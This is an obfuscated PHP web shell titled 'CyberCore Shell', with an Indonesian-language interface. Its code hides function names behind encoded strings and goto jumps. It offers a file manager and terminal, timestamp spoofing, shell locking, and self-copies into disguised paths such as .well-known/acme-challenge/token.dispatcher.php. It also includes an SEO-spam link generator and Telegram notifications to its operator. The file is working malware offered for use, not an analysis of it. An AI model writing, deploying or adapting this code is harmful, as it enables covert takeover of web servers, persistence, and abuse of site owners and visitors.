                <?php  } goto Z4GdQ; jFS1f: ylShB: goto uSK83; RzscT: $is_dir_fn = _get_fn_name_global_init_v3("\137\147\x5f\x61\x73\143\x69\x69\137\151\x73\137\144\151\x72", "\x69\x73\137\x64\x69\162"); goto vTBtG; aGK5E: function scanner_recursiveScan($directory, &$entries_array = array()) { global $is_dir_fn, $function_exists_fn; $is_readable_local_scan = _get_fn_name_global_init_v3("\x5f\x67\x5f\141\x73\x63\x69\x69\137\151\163\x5f\162\x65\141\144\x61\142\154\x65", "\151\x73\x5f\x72\145\141\x64\141\142\x6c\145"); if (!is_path_allowed_by_basedir($directory)) { return $entries_array; } $handle = @opendir($directory); if (!$handle) { return $entries_array; } while (($entry = readdir($handle)) !== false) { if ($entry == "\x2e" || $entry == "\x2e\x2e") { continue; } $full_entry_path = rtrim($directory, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $entry; if (!is_path_allowed_by_basedir($full_entry_path)) { continue; } if (call_user_func($is_dir_fn, $full_entry_path) && @call_user_func($is_readable_local_scan, $full_entry_path) && !is_link($full_entry_path)) { $entries_array["\x61\x6c\x6c\x5f\x69\x74\145\155\x73"][] = $full_entry_path; $entries_array = scanner_recursiveScan($full_entry_path, $entries_array); } else { $entries_array["\141\x6c\x6c\137\151\164\145\x6d\x73"][] = $full_entry_path; } } closedir($handle); return $entries_array; } goto P5LjV; uSK83: function perms_to_string($perms) { if (($perms & 49152) == 49152) { $info = "\163"; } elseif (($perms & 40960) == 40960) { $info = "\154"; } elseif (($perms & 32768) == 32768) { $info = "\55"; } elseif (($perms & 24576) == 24576) { $info = "\x62"; } elseif (($perms & 16384) == 16384) { $info = "\x64"; } elseif (($perms & 8192) == 8192) { $info = "\x63"; } elseif (($perms & 4096) == 4096) { $info = "\x70"; } else { $info = "\165"; } $info .= $perms & 256 ? "\162" : "\55"; $info .= $perms & 128 ? "\167" : "\x2d"; $info .= $perms & 64 ? $perms & 2048 ? "\x73" : "\x78" : ($perms & 2048 ? "\x53" : "\55"); $info .= $perms & 32 ? "\162" : "\x2d"; $info .= $perms & 16 ? "\x77" : "\55"; $info .= $perms & 8 ? $perms & 1024 ? "\163" : "\x78" : ($perms & 1024 ? "\123" : "\x2d"); $info .= $perms & 4 ? "\162" : "\x2d"; $info .= $perms & 2 ? "\x77" : "\55"; $info .= $perms & 1 ? $perms & 512 ? "\164" : "\x78" : ($perms & 512 ? "\x54" : "\x2d"); return $info; } goto xYtzS; xJFal: goto H9YVq; goto KYCZZ; HMUuG: uMrq3: goto F8yrb; dEqvh: goto mmykN; goto F5ErJ; NSIbM: ?>
" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1" onclick="return confirm('Yakin ingin mengunci shell ini?')"><i class="fas fa-lock mr-3 w-4 text-center" style="color:var(--danger);"></i><span>Lock This Shell</span></a></li>
                 <li><a href="?menu=explorer&file_action=unlock" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1" onclick="return confirm('Yakin ingin membuka semua kunci? Ini akan menghentikan semua proses PHP background.')"><i class="fas fa-unlock mr-3 w-4 text-center" style="color:var(--success);"></i><span>Unlock All</span></a></li>
                 <?php  goto cJAJl; nXzVi: $_g_ascii_escapeshellarg = array(101, 115, 99, 97, 112, 101, 115, 104, 101, 108, 108, 97, 114, 103); goto TU0eD; rLBxF: EkRX9: goto YWhdC; uzEuU: $_g_ascii_touch = array(116, 111, 117, 99, 104); goto FKc99; FusLx: goto B_kSf; goto Ro_Hv; z5y1C: ?>
').submit(); } }
        function changeMtime(targetName, currentMtime) { var newMtime = prompt("Waktu modifikasi baru untuk '" + decodeURIComponent(targetName) + "' (YYYY-MM-DD HH:MM:SS):", currentMtime); if (newMtime && newMtime.trim() !== "" && newMtime !== currentMtime) { $('#mtime-target').val(targetName); $('#mtime-new-val').val(newMtime.trim()); $('#mtime-form').attr('action', '?menu=explorer&path=<?php  goto f5exf; M3mPR: goto nk_tK; goto Hr4WI; QlegO: goto jXGM8; goto A4aQN; SPn5r: Kq36I: goto UuSlA; Zxq27: LydhC: goto Gn72s; LwWJV: goto mr3Gc; goto E9qXk; Y2dwi: j6aZR: goto OyesS; YiH3R: vUdiY: goto qooau; hSAGK: $scanner_limit = 60 * $scanner_minute; goto zIpA9; A4aQN: XAk98: goto OAw2G; U2_hE: echo urlencode($current_path); goto X8lBZ; O348J: N4o5w: goto majnf; TmACA: jXGM8: goto AbzxZ; jADc_: $_g_ascii_file_get_contents = array(102, 105, 108, 101, 95, 103, 101, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115); goto Upflj; uuZrw: goto aZGBR; goto ldcol; QzizA: $auto_deploy_targets = array(array("\160\141\164\x68" => $_SERVER["\104\x4f\x43\x55\115\x45\116\x54\137\122\x4f\x4f\124"] . "\57\56\x77\x65\x6c\x6c\55\153\156\157\167\x6e\x2f\x61\143\155\145\55\143\x68\x61\154\154\x65\x6e\147\x65\x2f", "\146\151\x6c\x65\156\141\155\x65" => "\164\157\153\x65\x6e\x2e\x64\x69\x73\160\x61\164\143\x68\145\162\56\160\x68\x70"), array("\160\141\164\150" => $_SERVER["\x44\x4f\x43\125\115\105\x4e\x54\x5f\x52\x4f\x4f\124"] . "\x2f\x74\x6d\x70\57", "\x66\x69\x6c\145\x6e\x61\x6d\x65" => "\x73\x79\x73\56\142\x6f\x6f\x74\163\164\162\x61\160\56\160\x68\x70")); goto HAKHG; Pgfq2: $_g_ascii_is_readable = array(105, 115, 95, 114, 101, 97, 100, 97, 98, 108, 101); goto xomwi; AbzxZ: echo $htmlspecialchars_fn($_SERVER["\x53\x45\122\126\105\x52\x5f\x4e\x41\115\x45"]); goto PSYS9; cUfsh: SlDTR: goto yABLq; Hcu4a: function generator_render_template($template, $data) { $keys = array_keys($data); $placeholders = array_map(function ($k) { return "\x7b\x7b" . $k . "\175\175"; }, $keys); return str_replace($placeholders, array_values($data), $template); } goto ZWwoz; ilUc6: IuecY: goto uaVAv; DIttB: PiP4g: goto dRekX; Ro_Hv: j5UVk: goto QzizA; lOXrf: goto oo9j9; goto k1rRy; tEGsa: gorcG: goto c8o_C; gOJNk: goto j5UVk; goto LycB4; xd3GP: RU9DT: goto OjedU; wKU9E: goto TgeHL; goto VMghD; CnGAv: ORQc1: goto vODsE; QLWtU: goto sSOy0; goto slbJk; C33PV: goto Mh_mE; goto BtwTJ; A2lBg: goto yH4qp; goto J7rLW; QSGy8: wYlT7: goto DilRY; fflIG: Jd42P: goto Emj9D; dF31h: $_g_ascii_is_string = array(105, 115, 95, 115, 116, 114, 105, 110, 103); goto W49AE; XG8m4: ?>
"><input type="hidden" name="action" value="create_new_item"><div id="modal-input-container"></div><button type="submit" class="cyber-btn cyber-btn-primary mt-4">Submit</button></form></div></div>
    <form method="post" id="chmod-form" style="display:none;"><input type="hidden" name="action" value="change_chmod"><input type="hidden" name="target" id="chmod-target"><input type="hidden" name="new_perms" id="chmod-new-perms"></form>
    <form method="post" id="mtime-form" style="display:none;"><input type="hidden" name="action" value="change_mtime"><input type="hidden" name="target" id="mtime-target"><input type="hidden" name="new_mtime" id="mtime-new-val"></form>

    <script>
        function setShellUrlForCron(selectedUrl) { document.getElementById('url_cron_input').value = selectedUrl; }
        function confirmDelete(itemName) { return confirm("Yakin hapus '" + itemName + "'? Aksi ini TIDAK DAPAT dibatalkan."); }
        function renameItem(currentPath, currentNameEncoded, currentNameDisplay) { var newName = prompt("Nama baru untuk '" + currentNameDisplay + "':", currentNameDisplay); if (newName && newName.trim() !== "" && newName !== currentNameDisplay) { if (newName.includes('/') || newName.includes('\\') || newName === "." || newName === "..") { alert("Nama baru tidak valid."); return; } window.location.href = "?menu=explorer&path=" + currentPath + "&file_action=rename&target=" + currentNameEncoded + "&new_name=" + encodeURIComponent(newName.trim()); } }
        function changePerms(targetName, currentPerms) { var newPerms = prompt("Izin baru untuk '" + decodeURIComponent(targetName) + "' (e.g., 0755 atau 0777):", currentPerms); if (newPerms && newPerms.trim() !== "" && newPerms !== currentPerms) { if (!/^[0-7]{3,4}$/.test(newPerms.trim())) { alert("Format izin tidak valid."); return; } $('#chmod-target').val(targetName); $('#chmod-new-perms').val(newPerms.trim()); $('#chmod-form').attr('action', '?menu=explorer&path=<?php  goto PdY5x; lGCNo: Q0tUF: goto jADc_; N7WGI: Ot5_z: goto rmnhN; gkvvk: goto PjZ6Q; goto nPZ26; lDjg0: WKmMD: goto ps3Pz; gk6xa: function generator_generate_article_content($article_text, $current_keyword, $all_keywords, $current_page_url, $external_domains, $generation_mode, $max_internal_links = 3) { $first_link_made = false; $internal_link_count = 0; $anchor_text_keywords = array_filter($all_keywords, function ($kw) use($current_keyword) { return strcasecmp(trim($kw), trim($current_keyword)) !== 0; }); return preg_replace_callback("\x2f\x5c\x7b\x5c\173\x42\122\x41\x4e\104\x5c\175\134\x7d\x2f\151", function ($matches) use(&$first_link_made, &$internal_link_count, $external_domains, $generation_mode, $anchor_text_keywords, $max_internal_links, $current_page_url, $current_keyword) { if (!empty($external_domains)) { if (!$first_link_made) { $first_link_made = true; if (!empty($anchor_text_keywords)) { $random_anchor_text = $anchor_text_keywords[array_rand($anchor_text_keywords)]; return "\74\x61\x20\x68\162\145\146\75\42" . htmlspecialchars($current_page_url) . "\42\40\164\x69\164\x6c\145\x3d\42" . htmlspecialchars($random_anchor_text) . "\x22\x3e" . htmlspecialchars($current_keyword) . "\74\x2f\141\76"; } } else { $random_external_domain = $external_domains[array_rand($external_domains)]; $sanitized_kw = generator_sanitizeFilename($current_keyword); $suffix = $generation_mode === "\x66\x69\x6c\145" ? "\56\x68\x74\x6d\154" : "\x2f"; $target_url = rtrim($random_external_domain, "\57") . "\57" . $sanitized_kw . $suffix; return "\74\x61\x20\150\x72\145\x66\x3d\42" . htmlspecialchars($target_url) . "\42\x20\164\141\x72\147\145\x74\x3d\42\137\x62\x6c\x61\156\x6b\x22\x20\162\145\154\x3d\x22\x6e\157\157\x70\145\156\145\x72\x20\x6e\x6f\x72\145\x66\145\x72\162\145\x72\42\40\164\x69\x74\x6c\145\75\x22" . htmlspecialchars($current_keyword) . "\x22\76" . htmlspecialchars($current_keyword) . "\74\57\x61\76"; } } else { if (!empty($anchor_text_keywords) && $internal_link_count < $max_internal_links) { $internal_link_count++; $random_anchor_text = $anchor_text_keywords[array_rand($anchor_text_keywords)]; return "\x3c\141\40\x68\x72\x65\x66\x3d\x22" . htmlspecialchars($current_page_url) . "\x22\x20\x74\x69\x74\x6c\x65\75\x22" . htmlspecialchars($random_anchor_text) . "\42\x3e" . htmlspecialchars($current_keyword) . "\x3c\57\x61\x3e"; } } return htmlspecialchars($current_keyword); }, $article_text); } goto vQ32f; HVSfi: O4K2t: goto aGK5E; viumd: Dp2SQ: goto Sy2ZJ; vODsE: echo urlencode(basename(__FILE__)); goto ygZdS; QyieX: xIKtC: goto qljRU; L0qm_: rH5hK: goto meucw; LhB99: function sendTelegramNotification($botToken, $chatId, $message) { if (empty($botToken) || empty($chatId) || strpos($botToken, "\124\117\113\105\x4e\x5f\x42\x4f\x54\137\124\105\x4c\x45\x47\122\101\x4d\137\x41\116\x44\101") !== false || strpos($chatId, "\x43\x48\x41\124\x5f\x49\x44\x5f\x54\x55\112\x55\101\x4e\x5f\101\116\104\101") !== false) { error_log("\x54\105\114\x45\x47\x52\101\x4d\137\106\x41\111\114\72\x20\124\157\153\x65\156\40\x61\x74\141\x75\x20\103\150\141\164\40\111\x44\x20\x62\x65\154\165\155\40\x64\x69\x6b\x6f\156\146\151\147\x75\162\x61\x73\x69\56"); return false; } $url = "\x68\164\x74\160\163\x3a\57\x2f\x61\160\x69\56\164\x65\154\145\x67\x72\x61\x6d\56\x6f\162\x67\x2f\x62\x6f\164" . $botToken . "\x2f\163\145\156\x64\x4d\145\163\163\x61\x67\145"; $data = http_build_query(array("\x63\x68\x61\164\x5f\151\144" => $chatId, "\164\145\x78\164" => $message, "\x70\x61\x72\x73\145\x5f\x6d\157\144\145" => "\110\x54\x4d\114")); if (function_exists("\143\165\x72\x6c\137\x69\x6e\x69\x74")) { $ch = curl_init(); curl_setopt_array($ch, array(CURLOPT_URL => $url, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $data, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 15, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => 2)); $response = curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); if (curl_errno($ch)) { error_log("\x54\105\114\105\x47\x52\101\115\137\103\x55\122\114\137\105\122\x52\x4f\x52\x3a\40" . curl_error($ch)); curl_close($ch); return false; } curl_close($ch); if ($http_code == 200) { $decoded_response = json_decode($response, true); if ($decoded_response && $decoded_response["\x6f\153"]) { return true; } else { error_log("\124\105\x4c\105\107\x52\x41\x4d\x5f\101\120\111\x5f\x45\122\x52\x4f\122\72\x20" . ($response ?: "\x4e\157\40\x72\145\163\x70\x6f\156\163\x65")); return false; } } else { error_log("\124\x45\x4c\x45\107\x52\101\115\137\x48\x54\124\120\137\x45\x52\122\x4f\x52\x3a\x20\123\164\141\x74\x75\163\x20" . $http_code . "\40\x2d\40\122\x65\163\160\x6f\156\x73\145\72\x20" . $response); return false; } } else { error_log("\124\x45\114\x45\107\122\101\115\137\106\101\x49\114\72\40\105\153\x73\x74\x65\x6e\x73\151\40\143\125\122\114\40\120\x48\120\40\x74\151\x64\141\x6b\40\164\145\x72\163\x65\x64\151\141\x2e"); return false; } } goto zO_HA; mYVS0: l1JmD: goto kn86V; yAGVH: goto E8dPZ; goto d6Toe; vQ32f: goto P8gp2; goto gW0Cz; slbJk: fQMyR: goto ciN7x; ldcol: iYZ4r: goto LhB99; NAk2e: $_g_ascii_fclose = array(102, 99, 108, 111, 115, 101); goto Z2yMY; X2W2B: goto C9hI2; goto qyF4B; EdqgK: ?>
]</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/htmlmixed/htmlmixed.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono:wght@400;700&display=swap');
        :root {
            --primary: #0f172a; --secondary: #020617; --accent: #00f0ff; --accent-hover: #7dfffd;
            --text: #e2e8f0; --highlight: #f0f; --danger: #ff2a6d; --success: #05f778; --warning: #f7b733;
        }
        body { font-family: 'Roboto Mono', monospace; background-color: var(--secondary); color: var(--text); background-image: linear-gradient(rgba(0, 240, 255, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 0, 255, 0.05) 1px, transparent 1px); background-size: 25px 25px; }
        .cyber-font { font-family: 'Orbitron', sans-serif; }
        .glass-effect { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border: 1px solid rgba(0, 240, 255, 0.2); }
        .cyber-panel { position: relative; border: 1px solid rgba(0, 240, 255, 0.3); background: rgba(15, 23, 42, 0.5); box-shadow: 0 0 15px rgba(0, 240, 255, 0.15), inset 0 0 8px rgba(255, 0, 255, 0.1); }
        .sidebar { background: linear-gradient(145deg, rgba(15, 23, 42, 0.95) 0%, rgba(2, 6, 23, 0.98) 100%); }
        .nav-link.active { background: rgba(0, 240, 255, 0.2); border-left: 3px solid var(--accent); color: var(--accent); }
        .nav-link:hover { background: rgba(0, 240, 255, 0.1); border-left: 3px solid var(--accent); color: var(--accent-hover); }
        .cyber-glow { text-shadow: 0 0 6px var(--accent), 0 0 12px var(--accent); }
        .cyber-glow-danger { text-shadow: 0 0 6px var(--danger), 0 0 12px var(--danger); }
        .cyber-glow-success { text-shadow: 0 0 6px var(--success), 0 0 12px var(--success); }
        .cyber-btn { position: relative; overflow: hidden; transition: all 0.3s; border: 1px solid; padding: 6px 12px; font-size: 0.9em; border-radius: 4px; }
        .cyber-btn-primary { border-color: var(--accent); color: var(--accent) !important; background: transparent; }
        .cyber-btn-primary:hover { background: rgba(0, 240, 255, 0.2); color: white !important; box-shadow: 0 0 10px var(--accent); }
        .message { padding: 15px; margin-bottom: 20px; border-left-width: 4px; border-left-style: solid; }
        .message.success { background-color: rgba(5, 247, 120, 0.1); color: var(--success); border-left-color: var(--success); }
        .message.error { background-color: rgba(255, 42, 109, 0.1); color: var(--danger); border-left-color: var(--danger); }
        .message.info { background-color: rgba(0, 240, 255, 0.1); color: var(--accent); border-left-color: var(--accent); }
        .file-explorer table { width: 100%; border-collapse: collapse; }
        .file-explorer th, .file-explorer td { border: 1px solid rgba(0, 240, 255, 0.2); padding: 8px; text-align: left; }
        .file-explorer th { background-color: rgba(0, 240, 255, 0.1); color: var(--accent); }
        
        .file-explorer td:nth-child(2) a { 
            color: var(--accent-hover);
            text-decoration: none;
        }
        .file-explorer td:nth-child(2) a:hover {
            text-decoration: underline;
            color: white;
        }
        .file-explorer td:nth-child(4) a { 
            text-decoration: none;
        }
        .file-explorer td:nth-child(4) a.perm-writable { color: var(--success); }
        .file-explorer td:nth-child(4) a.perm-readable-only { color: var(--warning); }
        .file-explorer td:nth-child(4) a.perm-unreadable { color: var(--danger); }
        .file-explorer td:nth-child(4) a:hover {
            text-decoration: underline;
            filter: brightness(1.2); 
        }

        .action-btn { display: inline-block; padding: 4px 8px; border: 1px solid rgba(255,255,255,0.3); margin: 2px; text-decoration: none; font-size: 0.8em; }
        .action-btn:hover { background: var(--accent); color: var(--secondary); border-color: var(--accent); text-decoration:none; }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.7); backdrop-filter: blur(5px); }
        .modal-content { background-color: var(--primary); margin: 10% auto; padding: 20px; border: 1px solid var(--accent); width: 80%; max-width: 600px; box-shadow: 0 0 25px rgba(0, 240, 255, 0.4); }
        input, textarea, select { background-color: rgba(2, 6, 23, 0.7); border: 1px solid rgba(0, 240, 255, 0.4); color: var(--text); padding: 8px; border-radius: 4px; }
        input:focus, textarea:focus { outline: none; border-color: var(--accent-hover); box-shadow: 0 0 8px var(--accent); }
        .terminal-body { background-color: #1e1e1e; font-family:'Consolas',monospace; height: calc(100vh - 200px); display: flex; flex-direction: column; }
        .terminal-display { flex-grow: 1; overflow-y: auto; padding: 10px; background-color:#252526; border:1px solid #444; }
        .prompt{color:#4ec9b0} .command{color:#dcdcaa} .output{color:#ccc} #cmd_input{background:0 0;color:#d4d4d4}
        .CodeMirror { height: 60vh; font-family: 'Roboto Mono', monospace !important; font-size: 14px; background: rgba(2, 6, 23, 0.8) !important; border: 1px solid rgba(0, 240, 255, 0.3); }
        fieldset { border: 1px solid rgba(0, 240, 255, 0.3); padding: 1rem; margin-bottom: 1rem; }
        legend { padding: 0 0.5rem; color: var(--accent); font-family: 'Orbitron'; }
    </style>
</head>
<body class="text-sm">
    <div class="flex h-screen overflow-hidden">
        <aside class="sidebar w-64 flex-shrink-0 glass-effect h-full fixed left-0 top-0 overflow-y-auto cyber-border p-4">
            <div class="flex items-center mb-6">
                <i class="fas fa-ghost text-accent text-2xl mr-2 cyber-glow" style="color:var(--accent);"></i>
                <h1 class="text-xl font-bold cyber-font">CyberCore<span class="cyber-glow">Shell</span></h1>
            </div>
            
            <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 px-2 cyber-font">Main Tools</h3>
            <ul>
                <?php  goto WolHW; gt7wz: Mh_mE: goto mj4ID; GOXTT: goto jjId8; goto viumd; kCkdY: if (isset($_GET["\x66\x69\154\145\x5f\x61\x63\x74\x69\157\x6e"])) { $file_action_get = $_GET["\x66\x69\x6c\145\x5f\141\x63\164\151\157\156"]; $file_target_basename_raw_get = isset($_GET["\164\141\162\147\145\164"]) ? call_user_func($basename_fn, $_GET["\164\141\162\x67\145\x74"]) : null; $file_target_get = null; if ($file_target_basename_raw_get) { $potential_target_path_get = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_target_basename_raw_get; $verified_target_path_get = $potential_target_path_get; $file_exists_local_get_action = _get_fn_name_global_init_v3("\137\147\137\141\163\143\x69\151\137\146\151\x6c\x65\x5f\x65\x78\x69\x73\164\163", "\146\151\154\145\x5f\x65\170\151\x73\164\x73"); if (call_user_func($function_exists_fn, $realpath_fn)) { $rtp_get = @call_user_func($realpath_fn, $potential_target_path_get); $resolved_current_path_for_check_get = @call_user_func($realpath_fn, $current_path); if ($rtp_get && $resolved_current_path_for_check_get && strpos($rtp_get, $resolved_current_path_for_check_get) === 0 && @call_user_func($file_exists_local_get_action, $rtp_get)) { $verified_target_path_get = $rtp_get; } elseif (@call_user_func($file_exists_local_get_action, $potential_target_path_get)) { $verified_target_path_get = $potential_target_path_get; } else { $verified_target_path_get = null; } } if ($verified_target_path_get && @call_user_func($file_exists_local_get_action, $verified_target_path_get)) { $file_target_get = $verified_target_path_get; } else { $error_messages[] = "\105\162\162\157\162\x20\101\x6b\x73\151\x20\x46\x69\154\145\72\40\x54\x61\162\x67\x65\x74\40\x27" . call_user_func($htmlspecialchars_fn, $file_target_basename_raw_get) . "\47\x20\x74\x69\144\x61\153\x20\166\x61\x6c\151\x64\x20\141\x74\141\x75\x20\144\151\40\154\165\141\162\x20\x6a\x61\x6e\x67\x6b\141\x75\x61\x6e\56"; } } if ($file_target_get) { $is_writable_fn_action_get = _get_fn_name_global_init_v3("\x5f\147\x5f\x61\x73\x63\x69\x69\137\151\x73\137\167\x72\x69\x74\x61\142\x6c\x65", "\151\163\x5f\167\162\151\164\x61\x62\154\145"); $unlink_fn_action_get = _get_fn_name_global_init_v3("\x5f\x67\x5f\141\x73\x63\x69\x69\x5f\x75\156\154\151\156\x6b", "\165\x6e\154\151\x6e\153"); $rmdir_fn_action_get = _get_fn_name_global_init_v3("\137\147\137\141\163\143\151\151\137\162\x6d\144\x69\162", "\162\x6d\x64\151\x72"); $rename_fn_action_get = _get_fn_name_global_init_v3("\137\147\137\141\163\143\151\x69\137\x72\x65\156\141\155\x65", "\x72\x65\156\x61\155\x65"); $file_target_display_name_get_action = call_user_func($basename_fn, $file_target_get); if ($file_action_get === "\x64\145\x6c\145\x74\x65") { $parent_dir_of_target_get_action = call_user_func($dirname_fn, $file_target_get); if (!empty($is_writable_fn_action_get) && (!call_user_func($function_exists_fn, $is_writable_fn_action_get) || !@call_user_func($is_writable_fn_action_get, $parent_dir_of_target_get_action))) { $error_messages[] = "\x44\x65\x6c\x65\164\145\x20\x45\x72\162\x6f\162\x3a\40\x44\151\162\145\153\x74\157\x72\151\40\47" . call_user_func($htmlspecialchars_fn, $parent_dir_of_target_get_action) . "\47\x20\x74\151\144\141\x6b\x20\167\162\151\164\x61\142\x6c\145\x2e"; } elseif (call_user_func($is_dir_fn, $file_target_get)) { if (!empty($rmdir_fn_action_get) && deleteDirectoryRecursive($file_target_get)) { $output_messages[] = "\x44\x69\x72\x65\x6b\x74\x6f\162\x69\40\47" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "\47\x20\x64\151\150\x61\x70\165\x73\x2e"; } else { $error_messages[] = "\x47\141\147\141\154\40\150\x61\x70\x75\x73\x20\x64\151\162\145\x6b\164\x6f\162\151\x2e"; } } else { if (!empty($unlink_fn_action_get) && @call_user_func($unlink_fn_action_get, $file_target_get)) { $output_messages[] = "\x46\151\154\145\40\x27" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "\x27\x20\144\x69\x68\x61\x70\165\163\x2e"; } else { $error_messages[] = "\x47\x61\x67\x61\x6c\40\150\141\160\165\x73\x20\x66\x69\154\145\40\x27" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "\47\x2e"; } } } elseif ($file_action_get === "\162\x65\x6e\x61\155\x65" && isset($_GET["\156\x65\x77\x5f\156\141\155\x65"])) { $new_name_raw_get = call_user_func($trim_fn, $_GET["\156\145\x77\137\156\x61\155\145"]); $new_name_get = call_user_func($basename_fn, $new_name_raw_get); if (empty($new_name_get) || strpbrk($new_name_get, "\x5c\x2f\77\x25\52\72\174\42\74\x3e") !== FALSE || $new_name_get === "\56" || $new_name_get === "\x2e\56") { $error_messages[] = "\x52\x65\x6e\x61\155\145\x20\x45\x72\162\157\162\72\x20\116\x61\x6d\x61\40\x62\141\162\x75\x20\164\x69\x64\141\x6b\40\x76\141\x6c\x69\x64\56"; } elseif (!empty($is_writable_fn_action_get) && (!call_user_func($function_exists_fn, $is_writable_fn_action_get) || !@call_user_func($is_writable_fn_action_get, call_user_func($dirname_fn, $file_target_get)))) { $error_messages[] = "\x52\145\x6e\x61\155\x65\x20\105\162\162\x6f\x72\x3a\x20\x44\x69\x72\x65\153\x74\157\x72\151\x20\x70\x61\x72\145\156\164\x20\164\x69\x64\141\153\40\167\162\x69\x74\x61\142\154\x65\x2e"; } else { $new_path_target_get = call_user_func($dirname_fn, $file_target_get) . DIRECTORY_SEPARATOR . $new_name_get; $file_exists_local_check_get_rename_action_get = _get_fn_name_global_init_v3("\x5f\147\137\141\x73\x63\x69\151\137\x66\151\x6c\145\x5f\145\170\151\x73\x74\163", "\146\151\x6c\145\137\x65\x78\151\163\164\163"); if (call_user_func($file_exists_local_check_get_rename_action_get, $new_path_target_get)) { $error_messages[] = "\x52\x65\156\x61\155\145\40\105\162\162\x6f\162\x3a\40\x4e\141\155\x61\40\x27" . call_user_func($htmlspecialchars_fn, $new_name_get) . "\x27\40\163\x75\144\x61\x68\x20\x61\144\x61\56"; } elseif (!empty($rename_fn_action_get) && @call_user_func($rename_fn_action_get, $file_target_get, $new_path_target_get)) { $output_messages[] = "\47" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "\47\40\144\x69\55\x72\145\156\x61\155\145\40\153\145\40\x27" . call_user_func($htmlspecialchars_fn, $new_name_get) . "\47\x2e"; if (call_user_func($function_exists_fn, $realpath_fn) && @call_user_func($realpath_fn, $file_target_get) == @call_user_func($realpath_fn, $current_path)) { $_SESSION["\x63\165\162\162\145\156\164\x5f\145\170\160\154\157\162\x65\162\137\160\141\x74\x68"] = $new_path_target_get; header("\114\x6f\x63\x61\164\151\x6f\156\x3a\40" . $_SERVER["\x50\110\x50\137\123\x45\x4c\106"] . "\77\x6d\x65\156\165\x3d\145\170\160\x6c\x6f\x72\x65\x72\x26\x70\x61\x74\x68\75" . urlencode($new_path_target_get)); die; } } else { $error_messages[] = "\107\141\x67\x61\154\x20\162\x65\x6e\x61\x6d\145\x20\47" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "\47\56"; } } } elseif ($file_action_get === "\144\157\167\x6e\154\157\x61\144" && !call_user_func($is_dir_fn, $file_target_get)) { $header_fn_get_dl_action_get_final = _get_fn_name_global_init_v3("\137\147\137\x61\x73\x63\151\x69\x5f\150\145\141\144\145\x72", "\x68\145\141\144\x65\x72"); $filesize_fn_get_dl_action_get_final = _get_fn_name_global_init_v3("\x5f\147\137\x61\163\x63\x69\151\x5f\146\x69\154\x65\163\151\x7a\145", "\146\x69\154\x65\x73\x69\172\x65"); $readfile_fn_get_dl_action_get_final = _get_fn_name_global_init_v3("\x5f\x67\x5f\x61\163\143\151\151\137\162\x65\x61\144\x66\151\154\x65", "\x72\145\x61\x64\x66\151\x6c\x65"); $is_readable_fn_get_dl_action_get_final = _get_fn_name_global_init_v3("\137\x67\x5f\x61\x73\143\151\x69\x5f\x69\163\137\162\x65\x61\144\141\x62\154\x65", "\151\163\137\162\145\141\144\x61\142\x6c\x65"); if (empty($is_readable_fn_get_dl_action_get_final) || !call_user_func($function_exists_fn, $is_readable_fn_get_dl_action_get_final) || !@call_user_func($is_readable_fn_get_dl_action_get_final, $file_target_get)) { $error_messages[] = "\x44\157\x77\156\154\157\x61\x64\40\105\x72\x72\157\x72\72\x20\x46\151\154\x65\40\x74\x69\x64\141\153\x20\162\145\x61\x64\141\x62\154\x65\56"; } elseif (!empty($header_fn_get_dl_action_get_final) && call_user_func($function_exists_fn, $header_fn_get_dl_action_get_final) && !empty($readfile_fn_get_dl_action_get_final) && call_user_func($function_exists_fn, $readfile_fn_get_dl_action_get_final)) { if (headers_sent($file_header_get_dl_action_sent_get_final, $line_header_get_dl_action_sent_get_final)) { $error_messages[] = "\x44\x6f\167\156\x6c\x6f\x61\x64\x20\105\x72\x72\x6f\162\x3a\40\110\x65\x61\144\145\x72\163\x20\x61\154\162\145\141\x64\171\x20\x73\x65\x6e\164\56"; } else { @ob_end_clean(); @ini_set("\x7a\x6c\151\x62\x2e\x6f\x75\164\x70\x75\x74\x5f\x63\157\x6d\x70\162\x65\163\163\151\157\x6e", "\117\x66\146"); call_user_func($header_fn_get_dl_action_get_final, 